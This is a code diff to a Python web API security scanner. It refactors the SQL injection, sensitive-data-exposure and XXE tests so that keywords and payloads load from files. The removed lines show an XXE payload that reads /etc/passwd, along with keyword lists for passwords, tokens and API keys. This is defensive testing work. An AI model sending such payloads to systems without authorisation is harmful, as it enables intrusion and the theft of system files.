@@ -30,6 +30,14 @@ def check_api_accessibility(api_url):
     
 def test_get(api_url, payload, error_indicators, param=''):
     try:
+        response = requests.get(f"{api_url}/{param}/{quote(payload)}", timeout=10)
+        return analyze_response(response, error_indicators)
+    except requests.exceptions.RequestException as e:
+        print(f"Error: Failed to test {param} with GET due to: {str(e)}")
+        return False
+    
+def test_sql_get(api_url, payload, error_indicators, param=''):
+    try:
         response = requests.get(f"{api_url}?{param}={quote(payload)}", timeout=10)
         return analyze_response(response, error_indicators)
     except requests.exceptions.RequestException as e:
@@ -99,7 +107,7 @@ def test_sql_injection(api_url):
     # Testing each parameter with all payloads
     for param in parameters:
         for payload in all_payloads:
-            if test_get(api_url, payload, error_indicators, param):
+            if test_sql_get(api_url, payload, error_indicators, param):
                 vulnerabilities.append((param, payload, error_indicators, 'GET'))
             if test_post(api_url, payload, error_indicators, param):
                 vulnerabilities.append((param, payload, error_indicators, 'POST'))
@@ -107,7 +115,6 @@ def test_sql_injection(api_url):
     if vulnerabilities:
         return "Vulnerable", vulnerabilities
     return "Safe", "No vulnerabilities detected."
-
 
 def test_xss(api_url):
     # Common XSS payloads
@@ -257,7 +264,7 @@ def test_broken_authentication(api_url):
 
 def test_sensitive_data_exposure(api_url):
     """
-    Test for Sensitive Data Exposure vulnerabilities.
+    Enhanced test for Sensitive Data Exposure vulnerabilities.
     
     Args:
         api_url (str): The URL of the API endpoint to test.
@@ -265,29 +272,26 @@ def test_sensitive_data_exposure(api_url):
     Returns:
         tuple: A tuple containing the status ('Vulnerable' or 'Safe') and a detail message.
     """
-    # Sample sensitive data keywords to look for
-    sensitive_keywords = [
-        "password",
-        "credit card",
-        "social security number",
-        "api key",
-        "token",
-    ]
+    # Load sensitive data keywords from a file
+    sensitive_keywords = load_data(os.path.join(FILE_DIR, 'sensitive_data_indicators.txt'))
+    parameters = load_data(os.path.join(FILE_DIR, 'parameters.txt'))
 
     try:
-        # Make a request to the API and capture the response
-        response = requests.get(api_url)
-        
-        # Check if sensitive keywords are present in the response
-        for keyword in sensitive_keywords:
-            if keyword in response.text.lower():
-                return "Vulnerable", f"Sensitive data exposed: {keyword}"
+        for param in parameters:
+            # Make a request to the API and capture the response
+            response = requests.get(f"{api_url}/{param}")
 
-        # Check if the response includes any sensitive headers
-        for header in response.headers:
-            if any(keyword in header.lower() for keyword in sensitive_keywords):
-                return "Vulnerable", f"Sensitive data exposed in headers: {header}"
-        
+            # Check if sensitive keywords are present in the response body
+            if check_for_sensitive_data(response.text):
+                found_keywords = [keyword for keyword in sensitive_keywords if keyword in response.text.lower()]
+                return "Vulnerable", f"Sensitive data exposed in response body: {', '.join(found_keywords)}"
+
+            # Check if sensitive keywords are present in the response headers
+            header_data = ' '.join([f"{key}: {value}" for key, value in response.headers.items()])
+            if check_for_sensitive_data(header_data):
+                found_keywords = [keyword for keyword in sensitive_keywords if keyword in header_data.lower()]
+                return "Vulnerable", f"Sensitive data exposed in headers: {', '.join(found_keywords)}"
+
     except requests.exceptions.RequestException as e:
         return "Error", f"Failed to test due to network or connection error: {str(e)}"
 
@@ -295,7 +299,7 @@ def test_sensitive_data_exposure(api_url):
 
 def test_xxe(api_url):
     """
-    Test for XML External Entities (XXE) vulnerabilities.
+    Test for XML External Entities (XXE) vulnerabilities using multiple payloads.
     
     Args:
         api_url (str): The URL of the API endpoint to test.
@@ -303,24 +307,26 @@ def test_xxe(api_url):
     Returns:
         tuple: A tuple containing the status ('Vulnerable' or 'Safe') and a detail message.
     """
-    # XXE payload
-    xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
-    <!DOCTYPE foo [  
-    <!ELEMENT foo ANY >
-    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>  
-    <foo>&xxe;</foo>"""
+    # Load XXE payloads from a file
+    xxe_payloads = load_data(os.path.join(FILE_DIR, 'xxe_payloads.txt'))
+    headers = {'Content-Type': 'application/xml'}
 
-    try:
-        # Send the XXE payload as a POST request with XML content-type
-        headers = {'Content-Type': 'application/xml'}
-        response = requests.post(api_url, data=xxe_payload, headers=headers)
+    for xxe_payload in xxe_payloads:
+        try:
+            # Ensure the payload is properly formatted
+            xxe_payload = xxe_payload.strip()
+            if not xxe_payload:
+                continue
 
-        # Check if the response contains the content of the file
-        if "root:" in response.text or "bin:" in response.text:
-            return "Vulnerable", "XXE vulnerability detected. Sensitive file contents exposed."
+            # Send the XXE payload as a POST request with XML content-type
+            response = requests.post(api_url, data=xxe_payload, headers=headers)
 
-    except requests.exceptions.RequestException as e:
-        return "Error", f"Failed to test due to network or connection error: {str(e)}"
+            # Check if the response contains any typical indicators of file content
+            if "root:" in response.text or "bin:" in response.text or "/bin/bash" in response.text:
+                return "Vulnerable", f"XXE vulnerability detected. Sensitive file contents exposed with payload: {xxe_payload}"
+
+        except requests.exceptions.RequestException as e:
+            return "Error", f"Failed to test due to network or connection error: {str(e)}"
 
     return "Safe", "No XXE vulnerabilities detected."
 
